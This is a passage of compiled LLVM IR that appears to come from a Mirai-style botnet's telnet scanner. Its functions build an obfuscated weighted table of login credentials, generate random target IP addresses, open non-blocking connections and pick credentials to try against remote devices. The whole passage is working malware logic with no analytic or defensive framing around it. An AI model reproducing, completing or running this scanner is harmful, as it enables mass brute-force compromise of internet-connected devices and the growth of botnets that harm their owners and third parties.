  %1125 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1126 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1125, i32 0, i32 7
  %1127 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1126, i32 0, i32 0
  %1128 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1129 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1128, i32 0, i32 7
  %1130 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1129, i32 0, i32 0
  %1131 = load i32, i32* %35, align 4
  %1132 = sext i32 %1131 to i64
  %1133 = getelementptr inbounds i8, i8* %1130, i64 %1132
  %1134 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1135 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1134, i32 0, i32 4
  %1136 = load i32, i32* %1135, align 8
  %1137 = sext i32 %1136 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1127, i8* %1133, i64 %1137, i32 1, i1 false)
  %1138 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1139 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1138, i32 0, i32 7
  %1140 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1141 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1140, i32 0, i32 4
  %1142 = load i32, i32* %1141, align 8
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds [8192 x i8], [8192 x i8]* %1139, i64 0, i64 %1143
  store i8 0, i8* %1144, align 1
  br label %1145

; <label>:1145:                                   ; preds = %1119
  br label %694

; <label>:1146:                                   ; preds = %1108
  br label %610

; <label>:1147:                                   ; preds = %684, %615
  br label %1148

; <label>:1148:                                   ; preds = %1147, %592
  br label %1149

; <label>:1149:                                   ; preds = %1148, %566, %540
  %1150 = load i32, i32* %1, align 4
  %1151 = add nsw i32 %1150, 1
  store i32 %1151, i32* %1, align 4
  br label %528

; <label>:1152:                                   ; preds = %528
  br label %150
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = mul i64 %12, 24
  %14 = call i8* @realloc(i8* %9, i64 %13) #7
  %15 = bitcast i8* %14 to %struct.scanner_auth*
  store %struct.scanner_auth* %15, %struct.scanner_auth** @auth_table, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i8* @deobf(i8* %16, i32* %7)
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i32 0, i32 0
  store i8* %17, i8** %22, align 8
  %23 = load i32, i32* %7, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %26 = load i32, i32* @auth_table_len, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i64 %27
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i32 0, i32 4
  store i8 %24, i8* %29, align 4
  %30 = load i8*, i8** %5, align 8
  %31 = call i8* @deobf(i8* %30, i32* %7)
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* @auth_table_len, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 1
  store i8* %31, i8** %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = trunc i32 %37 to i8
  %39 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %40 = load i32, i32* @auth_table_len, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i64 %41
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i32 0, i32 5
  store i8 %38, i8* %43, align 1
  %44 = load i16, i16* @auth_table_max_weight, align 2
  %45 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %46 = load i32, i32* @auth_table_len, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i64 %47
  %49 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i32 0, i32 2
  store i16 %44, i16* %49, align 8
  %50 = load i16, i16* @auth_table_max_weight, align 2
  %51 = zext i16 %50 to i32
  %52 = load i16, i16* %6, align 2
  %53 = zext i16 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = trunc i32 %54 to i16
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %57 = load i32, i32* @auth_table_len, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* @auth_table_len, align 4
  %59 = sext i32 %57 to i64
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i64 %59
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 3
  store i16 %55, i16* %61, align 2
  %62 = load i16, i16* %6, align 2
  %63 = zext i16 %62 to i32
  %64 = load i16, i16* @auth_table_max_weight, align 2
  %65 = zext i16 %64 to i32
  %66 = add nsw i32 %65, %63
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4 x i8], align 1
  %3 = alloca i32, align 4
  br label %4

; <label>:4:                                      ; preds = %31, %0
  %5 = call i32 @rand_next()
  %6 = urem i32 %5, 255
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  store i8 %7, i8* %8, align 1
  %9 = call i32 @rand_next()
  %10 = urem i32 %9, 255
  %11 = trunc i32 %10 to i8
  %12 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  store i8 %11, i8* %12, align 1
  %13 = call i32 @rand_next()
  %14 = urem i32 %13, 255
  %15 = trunc i32 %14 to i8
  %16 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  store i8 %15, i8* %16, align 1
  %17 = call i32 @rand_next()
  %18 = urem i32 %17, 255
  %19 = trunc i32 %18 to i8
  %20 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  store i8 %19, i8* %20, align 1
  br label %21

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %23 = load i8, i8* %22, align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %31, label %26

; <label>:26:                                     ; preds = %21
  %27 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 127
  br label %31

; <label>:31:                                     ; preds = %26, %21
  %32 = phi i1 [ true, %21 ], [ %30, %26 ]
  br i1 %32, label %4, label %33

; <label>:33:                                     ; preds = %31
  %34 = call i32 @rand_next()
  %35 = urem i32 %34, 35
  store i32 %35, i32* %3, align 4
  %36 = load i32, i32* %3, align 4
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %38, label %55

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i32
  %42 = shl i32 %41, 16
  %43 = or i32 1996488704, %42
  %44 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = shl i32 %46, 8
  %48 = or i32 %43, %47
  %49 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = shl i32 %51, 0
  %53 = or i32 %48, %52
  %54 = call i32 @htonl(i32 %53) #9
  store i32 %54, i32* %1, align 4
  br label %238

; <label>:55:                                     ; preds = %33
  %56 = load i32, i32* %3, align 4
  %57 = icmp eq i32 %56, 1
  br i1 %57, label %58, label %70

; <label>:58:                                     ; preds = %55
  %59 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = shl i32 %61, 8
  %63 = or i32 2006777856, %62
  %64 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = shl i32 %66, 0
  %68 = or i32 %63, %67
  %69 = call i32 @htonl(i32 %68) #9
  store i32 %69, i32* %1, align 4
  br label %238

; <label>:70:                                     ; preds = %55
  %71 = load i32, i32* %3, align 4
  %72 = icmp eq i32 %71, 2
  br i1 %72, label %73, label %85

; <label>:73:                                     ; preds = %70
  %74 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = shl i32 %76, 8
  %78 = or i32 2006843392, %77
  %79 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %80 = load i8, i8* %79, align 1
  %81 = zext i8 %80 to i32
  %82 = shl i32 %81, 0
  %83 = or i32 %78, %82
  %84 = call i32 @htonl(i32 %83) #9
  store i32 %84, i32* %1, align 4
  br label %238

; <label>:85:                                     ; preds = %70
  %86 = load i32, i32* %3, align 4
  %87 = icmp eq i32 %86, 3
  br i1 %87, label %88, label %105

; <label>:88:                                     ; preds = %85
  %89 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = shl i32 %91, 16
  %93 = or i32 1946157056, %92
  %94 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = shl i32 %96, 8
  %98 = or i32 %93, %97
  %99 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %100 = load i8, i8* %99, align 1
  %101 = zext i8 %100 to i32
  %102 = shl i32 %101, 0
  %103 = or i32 %98, %102
  %104 = call i32 @htonl(i32 %103) #9
  store i32 %104, i32* %1, align 4
  br label %238

; <label>:105:                                    ; preds = %85
  %106 = load i32, i32* %3, align 4
  %107 = icmp eq i32 %106, 4
  br i1 %107, label %108, label %125

; <label>:108:                                    ; preds = %105
  %109 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = shl i32 %111, 16
  %113 = or i32 -1174405120, %112
  %114 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i32
  %117 = shl i32 %116, 8
  %118 = or i32 %113, %117
  %119 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = shl i32 %121, 0
  %123 = or i32 %118, %122
  %124 = call i32 @htonl(i32 %123) #9
  store i32 %124, i32* %1, align 4
  br label %238

; <label>:125:                                    ; preds = %105
  %126 = load i32, i32* %3, align 4
  %127 = icmp eq i32 %126, 5
  br i1 %127, label %128, label %145

; <label>:128:                                    ; preds = %125
  %129 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i32
  %132 = shl i32 %131, 16
  %133 = or i32 -1325400064, %132
  %134 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = shl i32 %136, 8
  %138 = or i32 %133, %137
  %139 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %140 = load i8, i8* %139, align 1
  %141 = zext i8 %140 to i32
  %142 = shl i32 %141, 0
  %143 = or i32 %138, %142
  %144 = call i32 @htonl(i32 %143) #9
  store i32 %144, i32* %1, align 4
  br label %238

; <label>:145:                                    ; preds = %125
  %146 = load i32, i32* %3, align 4
  %147 = icmp eq i32 %146, 6
  br i1 %147, label %151, label %148

; <label>:148:                                    ; preds = %145
  %149 = load i32, i32* %3, align 4
  %150 = icmp eq i32 %149, 7
  br i1 %150, label %151, label %163

; <label>:151:                                    ; preds = %148, %145
  %152 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %153 = load i8, i8* %152, align 1
  %154 = zext i8 %153 to i32
  %155 = shl i32 %154, 8
  %156 = or i32 1022558208, %155
  %157 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %158 = load i8, i8* %157, align 1
  %159 = zext i8 %158 to i32
  %160 = shl i32 %159, 0
  %161 = or i32 %156, %160
  %162 = call i32 @htonl(i32 %161) #9
  store i32 %162, i32* %1, align 4
  br label %238

; <label>:163:                                    ; preds = %148
  %164 = load i32, i32* %3, align 4
  %165 = icmp eq i32 %164, 10
  br i1 %165, label %169, label %166

; <label>:166:                                    ; preds = %163
  %167 = load i32, i32* %3, align 4
  %168 = icmp eq i32 %167, 11
  br i1 %168, label %169, label %181

; <label>:169:                                    ; preds = %166, %163
  %170 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %171 = load i8, i8* %170, align 1
  %172 = zext i8 %171 to i32
  %173 = shl i32 %172, 8
  %174 = or i32 1935802368, %173
  %175 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %176 = load i8, i8* %175, align 1
  %177 = zext i8 %176 to i32
  %178 = shl i32 %177, 0
  %179 = or i32 %174, %178
  %180 = call i32 @htonl(i32 %179) #9
  store i32 %180, i32* %1, align 4
  br label %238

; <label>:181:                                    ; preds = %166
  %182 = load i32, i32* %3, align 4
  %183 = icmp eq i32 %182, 12
  br i1 %183, label %187, label %184

; <label>:184:                                    ; preds = %181
  %185 = load i32, i32* %3, align 4
  %186 = icmp eq i32 %185, 13
  br i1 %186, label %187, label %199

; <label>:187:                                    ; preds = %184, %181
  %188 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %189 = load i8, i8* %188, align 1
  %190 = zext i8 %189 to i32
  %191 = shl i32 %190, 8
  %192 = or i32 -875298816, %191
  %193 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = shl i32 %195, 0
  %197 = or i32 %192, %196
  %198 = call i32 @htonl(i32 %197) #9
  store i32 %198, i32* %1, align 4
  br label %238

; <label>:199:                                    ; preds = %184
  %200 = load i32, i32* %3, align 4
  %201 = icmp eq i32 %200, 8
  br i1 %201, label %205, label %202

; <label>:202:                                    ; preds = %199
  %203 = load i32, i32* %3, align 4
  %204 = icmp eq i32 %203, 9
  br i1 %204, label %205, label %217

; <label>:205:                                    ; preds = %202, %199
  %206 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = shl i32 %208, 8
  %210 = or i32 453443584, %209
  %211 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = shl i32 %213, 0
  %215 = or i32 %210, %214
  %216 = call i32 @htonl(i32 %215) #9
  store i32 %216, i32* %1, align 4
  br label %238

; <label>:217:                                    ; preds = %202
  %218 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %219 = load i8, i8* %218, align 1
  %220 = zext i8 %219 to i32
  %221 = shl i32 %220, 24
  %222 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %223 = load i8, i8* %222, align 1
  %224 = zext i8 %223 to i32
  %225 = shl i32 %224, 16
  %226 = or i32 %221, %225
  %227 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %228 = load i8, i8* %227, align 1
  %229 = zext i8 %228 to i32
  %230 = shl i32 %229, 8
  %231 = or i32 %226, %230
  %232 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = shl i32 %234, 0
  %236 = or i32 %231, %235
  %237 = call i32 @htonl(i32 %236) #9
  store i32 %237, i32* %1, align 4
  br label %238

; <label>:238:                                    ; preds = %217, %205, %187, %169, %151, %128, %108, %88, %73, %58, %38
  %239 = load i32, i32* %1, align 4
  ret i32 %239
}

declare zeroext i16 @checksum_generic(i16*, i32) #2

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #5

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 2
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %17

; <label>:10:                                     ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 2
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 2
  store i32 -1, i32* %16, align 8
  br label %17

; <label>:17:                                     ; preds = %10, %1
  %18 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 2
  store i32 %18, i32* %20, align 8
  %21 = icmp eq i32 %18, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %71

; <label>:23:                                     ; preds = %17
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 1
  %26 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %25, i32 0, i32 1
  %27 = load i32, i32* %26, align 4
  %28 = icmp ugt i32 %27, -1
  br i1 %28, label %29, label %33

; <label>:29:                                     ; preds = %23
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %31, i32 0, i32 1
  store i32 -1, i32* %32, align 4
  br label %33

; <label>:33:                                     ; preds = %29, %23
  %34 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %35 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %34, i32 0, i32 4
  store i32 0, i32* %35, align 8
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %37, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 8192, i32 4, i1 false)
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 2
  %41 = load i32, i32* %40, align 8
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 2
  %44 = load i32, i32* %43, align 8
  %45 = call i32 (i32, i32, ...) @fcntl(i32 %44, i32 3, i32 0)
  %46 = or i32 2048, %45
  %47 = call i32 (i32, i32, ...) @fcntl(i32 %41, i32 4, i32 %46)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %48, align 4
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 15
  %51 = load i32, i32* %50, align 4
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %53 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %52, i32 0, i32 0
  store i32 %51, i32* %53, align 4
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 13
  %56 = load i16, i16* %55, align 8
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %56, i16* %57, align 2
  %58 = load i32, i32* @fake_time, align 4
  %59 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %60 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %59, i32 0, i32 3
  store i32 %58, i32* %60, align 4
  %61 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %61, i32 0, i32 16
  store i32 1, i32* %62, align 8
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %64 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i32 0, i32 2
  %65 = load i32, i32* %64, align 8
  %66 = bitcast %union.__SOCKADDR_ARG* %4 to %struct.sockaddr**
  %67 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %67, %struct.sockaddr** %66, align 8
  %68 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %4, i32 0, i32 0
  %69 = load %struct.sockaddr*, %struct.sockaddr** %68, align 8
  %70 = call i32 @connect(i32 %65, %struct.sockaddr* %69, i32 16)
  br label %71

; <label>:71:                                     ; preds = %33, %22
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @fdclose(%struct.scanner_connection*, i32) #0 {
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %6 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %5, i32 0, i32 8
  %7 = getelementptr inbounds [16 x i8], [16 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 16, i32 4, i1 false)
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 1
  %10 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %9, i32 0, i32 0
  store i32 0, i32* %10, align 8
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 12
  store i8 0, i8* %12, align 1
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 9
  store i8 0, i8* %14, align 4
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 1
  %17 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %16, i32 0, i32 1
  store i32 -1, i32* %17, align 4
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 5
  store i32 0, i32* %19, align 4
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 6
  store i32 0, i32* %21, align 8
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 2
  %24 = load i32, i32* %23, align 8
  %25 = icmp ne i32 %24, -1
  br i1 %25, label %26, label %31

; <label>:26:                                     ; preds = %2
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 2
  %29 = load i32, i32* %28, align 8
  %30 = call i32 @close(i32 %29)
  br label %31

; <label>:31:                                     ; preds = %26, %2
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 2
  store i32 -1, i32* %33, align 8
  %34 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %35 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %34, i32 0, i32 16
  store i32 0, i32* %35, align 8
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %46

; <label>:13:                                     ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %13
  br label %43

; <label>:25:                                     ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %47

; <label>:41:                                     ; preds = %25
  br label %42

; <label>:42:                                     ; preds = %41
  br label %43

; <label>:43:                                     ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %2, align 4
  br label %9

; <label>:46:                                     ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %47

; <label>:47:                                     ; preds = %46, %36
  %48 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %48
}

; Function Attrs: argmemonly nounwind
